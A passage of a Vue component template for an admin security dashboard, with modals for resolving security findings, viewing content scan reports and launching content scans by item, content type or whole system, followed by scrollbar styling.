              This action confirms the identified security violation has been remediated or cleared. The finding review status will be updated to <span class="font-bold text-foreground">Resolved</span>.
            </p>
          </div>
        </div>

        <!-- Resolution Note -->
        <div class="space-y-1.5">
          <div class="flex items-center justify-between">
            <label class="text-xs font-bold text-foreground">
              Resolution Note <span class="text-[10px] font-normal text-muted-foreground">(Optional)</span>
            </label>
            <span :class="cn('text-[10px] font-mono', (resolveForm.review_note?.length || 0) > 2000 ? 'text-rose-500 font-bold' : 'text-muted-foreground')">
              {{ resolveForm.review_note?.length || 0 }} / 2000
            </span>
          </div>
          <textarea
            v-model="resolveForm.review_note"
            rows="3"
            maxlength="2000"
            placeholder="Document remediation steps or resolution summary (max 2000 characters)..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all resize-none"
          ></textarea>
        </div>

        <!-- Form Error Banner -->
        <div v-if="resolveFormError" class="p-3 bg-rose-500/10 border border-rose-500/20 rounded-xl text-xs text-rose-600 dark:text-rose-400 flex items-center gap-2">
          <AlertCircle class="w-4 h-4 shrink-0" />
          <span>{{ resolveFormError }}</span>
        </div>

        <!-- Modal Footer Actions -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2.5">
          <button
            type="button"
            @click="closeFindingResolve"
            :disabled="isResolveSubmitting"
            class="h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer disabled:opacity-50"
          >
            Cancel
          </button>
          <button
            type="submit"
            :disabled="isResolveSubmitting || (resolveForm.review_note?.length || 0) > 2000"
            class="h-9 px-4 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold transition-colors cursor-pointer flex items-center gap-1.5 shadow-sm disabled:opacity-50"
          >
            <Loader2 v-if="isResolveSubmitting" class="w-3.5 h-3.5 animate-spin" />
            <CheckCircle v-else class="w-3.5 h-3.5" />
            <span>{{ isResolveSubmitting ? 'Resolving...' : 'Confirm Resolution' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: CONTENT SCAN DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isScanDetailModalOpen"
      :title="`Scan Details: #${selectedContentScan?.id || ''}`"
      :subtitle="`${selectedContentScan?.content_type} Content Inspection Report`"
      max-width="max-w-4xl"
      @close="closeScanDetail"
    >
      <div v-if="selectedContentScan" class="p-6 space-y-6 overflow-y-auto max-h-[75vh]">
        <!-- Summary Stats -->
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Status</p>
            <p class="text-sm font-bold">{{ selectedContentScan.status }}</p>
          </div>
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Risk Score</p>
            <p class="text-sm font-bold">{{ selectedContentScan.risk_score }}</p>
          </div>
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Findings</p>
            <p class="text-sm font-bold">{{ selectedContentScan.findings.length }}</p>
          </div>
          <div class="bg-muted/40 p-4 rounded-xl border border-border">
            <p class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Scanned At</p>
            <p class="text-sm font-bold">{{ new Date(selectedContentScan.scanned_at).toLocaleString() }}</p>
          </div>
        </div>

        <!-- Findings List -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">Detected Findings</h4>
          <div v-if="selectedContentScan.findings.length === 0" class="p-4 bg-muted/20 text-center text-xs text-muted-foreground rounded-xl">
            No findings detected.
          </div>
          <div v-else class="bg-card border border-border rounded-xl overflow-hidden">
            <table class="w-full text-xs">
              <thead class="bg-muted/40">
                <tr>
                  <th class="px-4 py-2 text-left">Category</th>
                  <th class="px-4 py-2 text-left">Severity</th>
                  <th class="px-4 py-2 text-left">Message</th>
                </tr>
              </thead>
              <tbody class="divide-y divide-border">
                <tr v-for="finding in selectedContentScan.findings" :key="finding.id">
                  <td class="px-4 py-2">{{ finding.category }}</td>
                  <td class="px-4 py-2">{{ finding.severity }}</td>
                  <td class="px-4 py-2">{{ finding.message }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </UiAdminModal>


    <!-- Run Content Scan Modal -->
    <UiAdminModal
      :is-open="isRunScanModalOpen"
      title="Run New Content Scan"
      :subtitle="scanMode === 'specific' ? 'Configure scan parameters for a specific content object' : scanMode === 'content_type' ? 'Configure scan parameters for an entire content type' : 'Configure system-wide scan across all content types'"
      max-width="max-w-lg"
      @close="isRunScanModalOpen = false"
    >
      <div class="p-6 space-y-5">
        <!-- Scan Mode Selector -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-muted-foreground uppercase tracking-wider">Scan Mode</label>
          <div class="grid grid-cols-3 gap-2">
            <button
              type="button"
              @click="scanMode = 'specific'"
              :class="cn(
                'p-3 rounded-xl border text-left transition-all flex flex-col items-center justify-center gap-1.5 cursor-pointer text-center',
                scanMode === 'specific'
                  ? 'border-primary bg-primary/5 text-primary ring-2 ring-primary/20 font-bold'
                  : 'border-input bg-card hover:bg-muted/50 text-muted-foreground'
              )"
            >
              <FileText class="w-4 h-4" />
              <span class="text-xs font-semibold">Specific Item</span>
            </button>

            <button
              type="button"
              @click="scanMode = 'content_type'"
              :class="cn(
                'p-3 rounded-xl border text-left transition-all flex flex-col items-center justify-center gap-1.5 cursor-pointer text-center',
                scanMode === 'content_type'
                  ? 'border-primary bg-primary/5 text-primary ring-2 ring-primary/20 font-bold'
                  : 'border-input bg-card hover:bg-muted/50 text-muted-foreground'
              )"
            >
              <Layers class="w-4 h-4" />
              <span class="text-xs font-semibold">Entire Type</span>
            </button>

            <button
              type="button"
              @click="scanMode = 'everything'"
              :class="cn(
                'p-3 rounded-xl border text-left transition-all flex flex-col items-center justify-center gap-1.5 cursor-pointer text-center',
                scanMode === 'everything'
                  ? 'border-primary bg-primary/5 text-primary ring-2 ring-primary/20 font-bold'
                  : 'border-input bg-card hover:bg-muted/50 text-muted-foreground'
              )"
            >
              <Globe2 class="w-4 h-4" />
              <span class="text-xs font-semibold">Everything</span>
            </button>
          </div>
        </div>

        <!-- Mode 1: Specific Item Inputs -->
        <template v-if="scanMode === 'specific'">
          <div class="space-y-1.5">
            <div class="flex items-center justify-between">
              <label class="text-xs font-bold text-muted-foreground uppercase">Target Item</label>
              <span v-if="isScanObjectsLoading" class="text-[11px] text-muted-foreground flex items-center gap-1">
                <Loader2 class="w-3 h-3 animate-spin" /> Searching...
              </span>
            </div>

            <div class="relative">
              <Search class="w-3.5 h-3.5 absolute left-2.5 top-2.5 text-muted-foreground pointer-events-none" />
              <input
                v-model="scanObjectSearchQuery"
                type="text"
                class="w-full h-9 pl-8 pr-3 rounded-md border border-input text-xs bg-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring/20"
                placeholder="Search products, categories, brands, or posts..."
              />
            </div>

            <div class="border border-input rounded-lg overflow-hidden bg-background relative flex flex-col">
              <div v-if="isScanObjectsLoading && availableScanObjects.length === 0" class="p-4 text-center text-xs text-muted-foreground flex items-center justify-center gap-2">
                <Loader2 class="w-4 h-4 animate-spin" /> Searching...
              </div>
              <div v-else-if="availableScanObjects.length === 0" class="p-4 text-center text-xs text-muted-foreground">
                No items found. Try a different search term.
              </div>
              <ul v-else class="max-h-48 overflow-y-auto">
                <li
                  v-for="obj in availableScanObjects"
                  :key="`${obj.type}-${obj.id}`"
                  @click="selectedScanObjectId = obj.id; selectedScanContentType = obj.type"
                  :class="cn(
                    'px-3 py-2 text-xs flex items-center justify-between cursor-pointer hover:bg-muted/50 transition-colors border-b border-border/50 last:border-b-0',
                    String(selectedScanObjectId) === String(obj.id) && selectedScanContentType === obj.type ? 'bg-primary/5 border-l-2 border-l-primary text-primary' : 'border-l-2 border-l-transparent'
                  )"
                >
                  <div class="flex flex-col gap-0.5 max-w-[70%]">
                    <span class="font-medium truncate">{{ obj.label }}</span>
                    <span class="text-[10px] text-muted-foreground truncate">{{ obj.sublabel }}</span>
                  </div>
                  <UiBadge variant="secondary" class="text-[10px] whitespace-nowrap">{{ obj.typeLabel }}</UiBadge>
                </li>
              </ul>
            </div>
            <p v-if="selectedScanObjectId" class="text-[11px] text-muted-foreground font-mono">
              Selected: <strong class="text-foreground">{{ selectedScanContentType }} #{{ selectedScanObjectId }}</strong>
            </p>
          </div>

          <div class="space-y-1">
            <label class="text-xs font-bold text-muted-foreground uppercase">Fields to Scan (Optional)</label>
            <input
              v-model="scanFieldsInput"
              type="text"
              class="w-full h-9 px-3 rounded-lg border border-input text-xs bg-background"
              placeholder="e.g., title, description"
            />
            <p class="text-[11px] text-muted-foreground">Leave empty to scan all default fields for this entity.</p>
          </div>
        </template>

        <!-- Mode 2: Entire Content Type Inputs -->
        <template v-else-if="scanMode === 'content_type'">
          <div class="space-y-1">
            <label class="text-xs font-bold text-muted-foreground uppercase">Content Type</label>
            <select
              v-model="selectedScanContentType"
              class="w-full h-9 px-3 rounded-lg border border-input bg-background text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option v-for="type in supportedContentTypes" :key="type.value" :value="type.value">
                {{ type.label }}
              </option>
            </select>
          </div>

          <div class="bg-amber-500/10 border border-amber-500/20 rounded-xl p-3 flex items-start gap-2 text-xs text-amber-700 dark:text-amber-400">
            <Info class="w-4 h-4 shrink-0 mt-0.5" />
            <span>Targeting all items of content type <strong>{{ selectedScanContentType }}</strong> across the store catalog.</span>
          </div>
        </template>

        <!-- Mode 3: Everything Inputs -->
        <template v-else-if="scanMode === 'everything'">
          <div class="bg-primary/5 border border-primary/15 rounded-xl p-4 space-y-2 text-xs">
            <div class="flex items-center gap-2 font-bold text-primary">
              <Globe2 class="w-4 h-4" />
              <span>Full System Content Security Inspection</span>
            </div>
            <p class="text-muted-foreground leading-relaxed">
              Targeting all supported content types across the system.
            </p>
          </div>
        </template>

        <!-- Actions -->
        <div class="pt-4 flex gap-3">
          <UiButton 
            variant="outline" 
            class="flex-1" 
            @click="isRunScanModalOpen = false"
          >
            Cancel
          </UiButton>
          <UiButton 
            class="flex-1" 
            :disabled="isSubmittingScanRun" 
            @click="submitScanRun"
          >
            {{ isSubmittingScanRun ? 'Initiating Scan...' : 'Run Content Scan' }}
          </UiButton>
        </div>
      </div>
    </UiAdminModal>
  </div>
</template>

<style scoped>
.custom-scrollbar::-webkit-scrollbar {
  height: 4px;
}
.custom-scrollbar::-webkit-scrollbar-track {
  background: transparent;
}
.custom-scrollbar::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.2);
  border-radius: 10px;
}
.custom-scrollbar:hover::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.4);
}
</style>
